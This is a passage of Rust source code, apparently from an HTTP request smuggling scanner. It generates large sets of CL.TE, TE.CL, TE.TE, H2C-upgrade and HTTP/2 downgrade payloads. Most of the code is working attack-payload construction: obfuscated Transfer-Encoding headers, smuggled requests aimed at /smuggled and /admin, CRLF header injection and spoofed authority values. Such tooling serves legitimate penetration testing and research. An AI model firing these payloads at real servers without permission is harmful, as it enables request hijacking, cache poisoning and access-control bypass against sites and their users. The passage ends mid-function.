/// Helper function to format custom headers into a string
fn format_custom_headers(custom_headers: &[String]) -> String {
    if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    }
}

/// Helper function to format cookies into a Cookie header
fn format_cookies(cookies: &[String]) -> String {
    if cookies.is_empty() {
        String::new()
    } else {
        format!("Cookie: {}\r\n", cookies.join("; "))
    }
}

/// Generate Transfer-Encoding header variations for CL.TE and TE.CL attacks
/// Based on PortSwigger's http-request-smuggler patterns
fn get_te_header_variations() -> Vec<String> {
    let mut te_headers = vec![
        // === Basic vanilla variation ===
        "Transfer-Encoding: chunked".to_string(),
        // === Whitespace variations ===
        " Transfer-Encoding: chunked".to_string(), // Space prefix (nameprefix with space)
        "\tTransfer-Encoding: chunked".to_string(), // Tab prefix
        "Transfer-Encoding : chunked".to_string(), // Space before colon (space1)
        "Transfer-Encoding  : chunked".to_string(), // Double space before colon
        "Transfer-Encoding\t: chunked".to_string(), // Tab before colon
        "Transfer-Encoding:\tchunked".to_string(), // Tab after colon
        "Transfer-Encoding\t:\tchunked".to_string(), // Tab around colon
        "Transfer-Encoding:  chunked".to_string(), // Double space after colon
        "Transfer-Encoding:chunked".to_string(),   // No space after colon (nospace1)
        "Transfer-Encoding: chunked ".to_string(), // Trailing space
        "Transfer-Encoding: chunked\t".to_string(), // Trailing tab (tabsuffix)
        "Transfer-Encoding: chunked\r".to_string(), // CR suffix (0dsuffix)
        // === Line wrapping/folding variations (HTTP/1.1 obs-fold) ===
        "Transfer-Encoding:\n chunked".to_string(), // Newline + space (linewrapped1)
        "Transfer-Encoding:\r\n chunked".to_string(), // CRLF + space (line folding)
        "Transfer-Encoding:\r\n\tchunked".to_string(), // CRLF + tab (tabwrap)
        "Transfer-Encoding\r\n : chunked".to_string(), // CRLF before colon
        "Transfer-Encoding:\r\n \r\n chunked".to_string(), // Double wrapped (doublewrapped)
        "Foo: bar\r\n Transfer-Encoding: chunked".to_string(), // Line-folded after another header (nameprefix1)
        "Foo: bar\r\n\tTransfer-Encoding: chunked".to_string(), // Tab-prefixed after header (nameprefix2)
        // === Control character variations ===
        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab after colon
        "Transfer-Encoding: \x0Bchunked".to_string(), // Vertical tab in value (vertwrap)
        "Transfer-Encoding:\x0Cchunked".to_string(), // Form feed after colon
        "Transfer-Encoding: chunked\n\x0B".to_string(), // Vertical tab wrap after value
        // === Special prefix/suffix bytes ===
        "\x00Transfer-Encoding: chunked".to_string(), // Null byte prefix
        "Transfer-Encoding\x00: chunked".to_string(), // Null in header name
        "Transfer-Encoding: chunked\x00".to_string(), // Null suffix
        "\x7FTransfer-Encoding: chunked".to_string(), // DEL char prefix
        "Transfer-Encoding\x7F: chunked".to_string(), // DEL in header name
        // === Quote variations ===
        "Transfer-Encoding: \"chunked\"".to_string(), // Double quoted (quoted)
        "Transfer-Encoding: 'chunked'".to_string(),   // Single quoted (aposed)
        // === Multiple encoding values ===
        "Transfer-Encoding: chunked, identity".to_string(), // Comma-separated (commaCow)
        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order (cowComma)
        "Transfer-Encoding: chunked,identity".to_string(),  // No space after comma
        "Transfer-Encoding: identity,chunked".to_string(),  // No space, reversed
        "Transfer-Encoding: chunked , identity".to_string(), // Spaces around comma
        "Transfer-Encoding: identity, chunked, identity".to_string(), // Nested encoding
        // === Header name variations ===
        "Transfer_Encoding: chunked".to_string(), // Underscore instead of hyphen (underjoin1)
        "Transfer Encoding: chunked".to_string(), // Space instead of hyphen (spacejoin1)
        "Transfer\\Encoding: chunked".to_string(), // Backslash instead of hyphen
        "Transfer\x00Encoding: chunked".to_string(), // Null in hyphen position
        // === Case variations ===
        "transfer-encoding: chunked".to_string(), // Lowercase
        "TRANSFER-ENCODING: chunked".to_string(), // Uppercase
        "TRANSFER-ENCODING: CHUNKED".to_string(), // All uppercase
        "tRaNsFeR-eNcOdInG: cHuNkEd".to_string(), // Mixed case (multiCase)
        "Transfer-encoding: chunked".to_string(), // First letter caps only
        // === Value variations ===
        "Transfer-Encoding: chunk".to_string(), // Truncated value (lazygrep)
        "Transfer-Encoding: CHUNKED".to_string(), // Uppercase value
        "Transfer-Encoding:  Chunked".to_string(), // Mixed case with extra space
        // === Bad line ending variations ===
        "Foo: bar\rTransfer-Encoding: chunked".to_string(), // CR only before TE (badsetupCR)
        "Foo: bar\nTransfer-Encoding: chunked".to_string(), // LF only before TE (badsetupLF)
        "Foo: bar\r\n\rTransfer-Encoding: chunked".to_string(), // Extra CR (0dwrap)
        // === CR injection variations ===
        "Tra\rnsfer-Encoding: chunked".to_string(), // CR in header name (0dspam)
        "Transfer-\rEncoding: chunked".to_string(), // CR after hyphen
        "Transfer-Encoding:\r chunked".to_string(), // CR + space after colon
        // === Junk/garbage variations ===
        "Transfer-Encoding x: chunked".to_string(), // Junk before colon (spjunk)
        "Transfer-Encoding: x chunked".to_string(), // Junk in value
        "X: y\r\nTransfer-Encoding: chunked".to_string(), // Preceded by junk header
        // === URL-encoded variations ===
        "Transfer-%45ncoding: chunked".to_string(), // URL-encoded E (encode)
        "Transfer-Encoding: %63hunked".to_string(), // URL-encoded c in value
        // === MIME encoding variations ===
        "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=".to_string(), // Base64 MIME (qencode)
        "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=".to_string(), // UTF-8 Base64 MIME (qencodeutf)
        // === HTTP/1.0 style ===
        "Transfer-Encoding: chunked".to_string(), // Standard for HTTP/1.0 test
    ];

    // Add extended ASCII variations (bytes > 0x7F) using String::from_utf8_lossy
    // These patterns are inspired by PortSwigger's nel, nbsp, shy, spaceFF, accentTE, accentCH
    let extended_ascii_patterns: Vec<String> = vec![
        // NEL character (0x85) - Next Line
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0x85])
        ),
        // NBSP (0xA0) - Non-Breaking Space
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // Soft hyphen (0xAD) replacing hyphen
        format!(
            "Transfer{}Encoding: chunked",
            String::from_utf8_lossy(&[0xAD])
        ),
        // NBSP after colon
        format!(
            "Transfer-Encoding:{}chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // High byte (0xFF) in value
        format!(
            "Transfer-Encoding: {}chunked",
            String::from_utf8_lossy(&[0xFF])
        ),
        // Accented character in name (0x82 - Latin Small Letter E with Acute in some encodings)
        format!(
            "Transf{}r-Encoding: chunked",
            String::from_utf8_lossy(&[0x82])
        ),
        // Accented character in value (0x96 - En Dash in some encodings)
        format!(
            "Transfer-Encoding: ch{}nked",
            String::from_utf8_lossy(&[0x96])
        ),
    ];
    te_headers.extend(extended_ascii_patterns);

    // Control character constants for header manipulation patterns
    // These are common control characters used in HTTP request smuggling attacks
    const NUL: u8 = 0x00; // Null byte - can cause early string termination in some parsers
    const TAB: u8 = 0x09; // Horizontal tab - valid HTTP whitespace
    const LF: u8 = 0x0A; // Line feed - HTTP line separator
    const VT: u8 = 0x0B; // Vertical tab - not valid HTTP whitespace, but sometimes accepted
    const FF: u8 = 0x0C; // Form feed - not valid HTTP whitespace, but sometimes accepted
    const CR: u8 = 0x0D; // Carriage return - HTTP line separator
    const SP: u8 = 0x20; // Space - valid HTTP whitespace
    const DEL: u8 = 0x7F; // Delete character - can cause parsing issues

    // Add whitespace prefix variations with common control characters
    // These test how parsers handle control characters before header names
    for ch in [NUL, TAB, LF, VT, FF, CR, SP, DEL].iter() {
        if *ch != TAB && *ch != SP {
            // Skip tab and space as they're already covered in basic variations
            te_headers.push(format!(
                "{}Transfer-Encoding: chunked",
                String::from_utf8_lossy(&[*ch])
            ));
        }
    }

    // Add suffix variations with control characters after the value
    // These test how parsers handle trailing control characters
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding: chunked{}",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    // Add header name suffix variations (control character before colon)
    // These test how parsers handle control characters in header names
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    te_headers
}

/// Generate CL.TE (Content-Length vs Transfer-Encoding) attack payloads
pub fn get_cl_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::new();
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}

/// Generate TE.CL (Transfer-Encoding vs Content-Length) attack payloads
pub fn get_te_cl_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::new();
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}

/// Generate TE.TE (Transfer-Encoding obfuscation) attack payloads
/// These payloads use two Transfer-Encoding headers to test for parser discrepancies
pub fn get_te_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let te_variations = vec![
        // === Basic dual header variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: cow"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: compress"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: deflate"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip"),
        // === Reversed dual chunk (revdualchunk) ===
        ("Transfer-Encoding: identity", "Transfer-Encoding: chunked"),
        // === Combined encodings ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: gzip, chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked, identity",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked",
        ),
        // === Nested encodings (nested) ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked, identity",
        ),
        // === Whitespace variations for second header ===
        ("Transfer-Encoding: chunked", " Transfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "\tTransfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:  chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:chunked"),
        // === Quote variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: \"chunked\"",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"),
        // === Case variations ===
        ("Transfer-Encoding: chunked", "transfer-encoding: chunked"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked"),
        ("Transfer-Encoding: chunked", "TrAnSfEr-EnCoDiNg: ChUnKeD"),
        ("Transfer-Encoding: chunked", "Transfer-encoding: chunked"),
        // === Header name variations ===
        ("Transfer-Encoding: chunked", "Transfer_Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer\\Encoding: chunked"),
        // === Line folding variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\n chunked"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n\tchunked",
        ),
        // === Control character variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\x0Bchunked",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\x00",
        ),
        // === Truncated/lazygrep variation ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunk"),
        // === Bad setup line endings ===
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\rTransfer-Encoding: chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\nTransfer-Encoding: chunked",
        ),
        // === Content-Encoding confusion (contentEnc) ===
        ("Transfer-Encoding: chunked", "Content-Encoding: chunked"),
        // === URL-encoded variations ===
        ("Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked"),
        // === Connection header combination ===
        (
            "Transfer-Encoding: chunked",
            "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked",
        ),
    ];

    // Add extended ASCII variations for TE.TE (bytes > 0x7F)
    let extended_te_te_variations: Vec<(String, String)> = vec![
        // NEL character (0x85)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0x85])
            ),
        ),
        // NBSP (0xA0)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0xA0])
            ),
        ),
    ];

    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    // Add extended ASCII variations
    for (te1, te2) in extended_te_te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    payloads
}

/// Generate H2C (HTTP/2 Cleartext) smuggling attack payloads
/// H2C smuggling exploits discrepancies in how proxies handle HTTP/1.1 to HTTP/2 upgrade requests
/// Reference: https://bishopfox.com/blog/h2c-smuggling-request
pub fn get_h2c_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let mut payloads = Vec::new();

    // Basic H2C upgrade request
    // The front-end may not process the upgrade, but the back-end might
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C upgrade with smuggled request (using Content-Length discrepancy)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 30\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Foo: x",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C upgrade with different Connection header variations
    let connection_variations = vec![
        "Connection: Upgrade, HTTP2-Settings, close",
        "Connection: Upgrade,HTTP2-Settings",
        "Connection: Upgrade, HTTP2-Settings, keep-alive",
        "Connection: HTTP2-Settings, Upgrade",
        "Connection: upgrade, http2-settings", // lowercase
        "Connection: UPGRADE, HTTP2-SETTINGS", // uppercase
    ];

    for conn_header in &connection_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             {}\r\n\
             Upgrade: h2c\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, conn_header
        ));
    }

    // Upgrade header variations
    let upgrade_variations = vec![
        "Upgrade: h2c",
        "Upgrade: H2C",           // uppercase
        "Upgrade: h2c, http/1.1", // multiple protocols
        "Upgrade: http/1.1, h2c", // reversed order
        " Upgrade: h2c",          // space prefix
        "Upgrade : h2c",          // space before colon
        "Upgrade:\th2c",          // tab after colon
    ];

    for upgrade_header in &upgrade_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             Connection: Upgrade, HTTP2-Settings\r\n\
             {}\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, upgrade_header
        ));
    }

    // HTTP2-Settings header variations (different base64 encoded SETTINGS frames)
    let http2_settings_variations = vec![
        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA",  // default
        "HTTP2-Settings: AAQAAP__",                  // minimal settings
        "HTTP2-Settings: AAMAAABkAAQAAP__AAIAAAAA",  // alternate settings
        "http2-settings: AAMAAABkAARAAAAAAAIAAAAA",  // lowercase
        "HTTP2-SETTINGS: AAMAAABkAARAAAAAAAIAAAAA",  // uppercase
        "HTTP2-Settings:AAMAAABkAARAAAAAAAIAAAAA",   // no space
        " HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", // space prefix
    ];

    for settings_header in &http2_settings_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             Connection: Upgrade, HTTP2-Settings\r\n\
             Upgrade: h2c\r\n\
             {}\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, settings_header
        ));
    }

    // H2C with Transfer-Encoding (combining H2C with CL.TE techniques)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C with chunked encoding (combining H2C with TE.CL techniques)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 4\r\n\
         \r\n\
         1\r\n\
         A\r\n\
         0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Double upgrade headers (upgrade obfuscation similar to TE.TE)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         Upgrade: http/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C with different HTTP2-Settings positions (HTTP2-Settings before Host)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    payloads
}

/// Generate H2 (HTTP/2 Protocol) smuggling attack payloads
/// HTTP/2 desync attacks exploit discrepancies in how front-end and back-end servers handle HTTP/2 features
/// Reference: https://portswigger.net/research/http2
pub fn get_h2_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let mut payloads = Vec::new();

    // === HTTP/2 Pseudo-Header Injection Attacks ===
    // These attacks exploit how servers handle duplicate or malformed pseudo-headers

    // Duplicate :method pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: GET\r\n\
         :method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Duplicate :path pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :path: {}\r\n\
         :path: /admin\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, path
    ));

    // Duplicate :authority pseudo-header (similar to Host header in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :authority: {}\r\n\
         :authority: malicious.com\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // Duplicate :scheme pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :scheme: https\r\n\
         :scheme: http\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Header Name with Colon Attacks ===
    // HTTP/2 allows colons in header names (as pseudo-headers), but HTTP/1.1 doesn't

    // Header name starting with colon (non-pseudo-header)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :custom-header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Header name with colon in the middle
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         x-custom:header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Content-Length Conflicts ===
    // HTTP/2 uses frame length, but some proxies still process Content-Length

    // Content-Length mismatch with smuggled request
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // Multiple Content-Length headers (forbidden in HTTP/2 but might be forwarded)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         Content-Length: 44\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Header Value with Newline Attacks ===
    // HTTP/2 doesn't allow newlines in header values, but HTTP/1.1 might accept them

    // Header value with embedded newline
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value1\nX-Injected: injected\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Header value with CRLF injection
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value1\r\nX-Injected: injected\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Transfer-Encoding (forbidden in HTTP/2) ===
    // HTTP/2 forbids Transfer-Encoding, but proxies might forward it to HTTP/1.1 backends

    // Transfer-Encoding in HTTP/2 context (should be rejected but might be smuggled)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Connection-Specific Headers (forbidden in HTTP/2) ===
    // HTTP/2 forbids connection-specific headers like Connection, Keep-Alive, etc.

    // Connection header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: close\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Keep-Alive header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Keep-Alive: timeout=5\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Proxy-Connection header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Proxy-Connection: keep-alive\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Case Sensitivity Attacks ===
    // HTTP/2 requires lowercase header names, HTTP/1.1 is case-insensitive

    // Mixed-case pseudo-header (invalid in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :Method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Uppercase pseudo-header (invalid in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :PATH: /admin\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Header Field Ordering Attacks ===
    // HTTP/2 requires pseudo-headers before regular headers

    // Regular header before pseudo-header (violates HTTP/2 spec)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value\r\n\
         :method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Header Name Validation Bypass ===
    // Test characters that are valid in HTTP/2 but not in HTTP/1.1

    // Header name with underscore (more permissive in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         x_custom_header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Content-Length: 0 with Body ===
    // HTTP/2 uses frame length, so Content-Length: 0 with body might be processed differently

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         unexpected body content",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Downgrade with Smuggled Request ===
    // Attack that exploits HTTP/2 to HTTP/1.1 downgrade

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Request Splitting via Header Injection ===
    // Inject full request in header value

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Additional HTTP/2 Specific Attacks ===

    // HTTP/2 with multiple pseudo-headers of different types
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: GET\r\n\
         :path: /admin\r\n\
         :authority: malicious.com\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Transfer-Encoding with pseudo-header (combining forbidden elements)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: POST\r\n\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // Pseudo-header after body (severe HTTP/2 violation)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         :path: /injected",
        method, path, host, custom_header_str, cookie_str
    ));

    // Multiple Content-Length with pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :authority: {}\r\n\
         Content-Length: 10\r\n\
         Content-Length: 0\r\n\
         \r\n\
         smuggled",
